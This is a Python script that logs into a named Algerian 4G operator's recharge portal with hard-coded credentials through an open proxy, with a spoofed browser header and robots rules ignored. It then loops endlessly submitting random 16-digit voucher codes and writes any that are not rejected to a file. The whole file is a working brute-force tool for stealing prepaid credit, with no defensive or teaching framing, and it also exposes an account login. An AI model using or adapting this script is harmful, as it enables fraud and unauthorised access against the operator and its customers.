import socket
import os
import sys

import random

try:
	import mechanize
except ImportError:
	os.system("sudo pip install mechanize")
	print '\033[93m'+"please run it again"+'\033[0m'
	exit()	

url = "https://4glte.at.dz/login"
radomNum = str(random.getrandbits(53))
useragents = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3'),
('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')]
failedDiv = ''
def main():
	print "am in Mechanize browsing"
	op=mechanize.Browser()
	op.set_proxies({'https':'41.105.28.35:3128'})
	print 'setting the handle_robot'
	op.set_handle_robots(False)
	print "selecting user agent as a header"
	op.addheaders = [('User-agent', random.choice(useragents))]
	print "now opening the Website"
	site = op.open(url)
	print site.read()
	print "select the form of the user"
	op.select_form(nr=0)
	print "adding user name and the password"
	op.form['username'] = "213471947929"
	op.form['password'] = "kalonline"
	print "submiting"
	op.submit()
	
	#follow a link
	print "selecting the link"
	for link in op.links():
		if link.url == "rechargement":
			link = link
			break
	print "folowing the link"
	op.follow_link(link)

	log = op.geturl()
	#resp = op.response().read()
	print "selecting the form of rechargement"
	op.select_form(nr=0)
	print "giving the first Wrong code"
	op.form['voucher'] = "3412567896543215"
	print "submiting it"
	op.submit()
	print "going back"
	op.back()
	print "chosing another random number"
	radomNum = str(random.getrandbits(53))
	print "opening a text file"
	file = open("RightCodes.txt","w")
	while(True):
		if len(radomNum) == 16:
			print 'selecting the rechargement form'
			op.select_form(nr=0)
			print "giving the Code"
			op.form['voucher'] = radomNum
			print "submiting it"
			op.submit()
			print "waiting for the response"
			resp = op.response().read()
			if "est incorrect," in resp:
				print "FalseCode:",radomNum
				op.back()
			else:
				print "found the code its:",radomNum
				file.write(str(radomNum)+"\n")
				op.back()
				radomNum = str(random.getrandbits(53))

		radomNum = str(random.getrandbits(53))

	

	

if __name__ == "__main__":
	main()





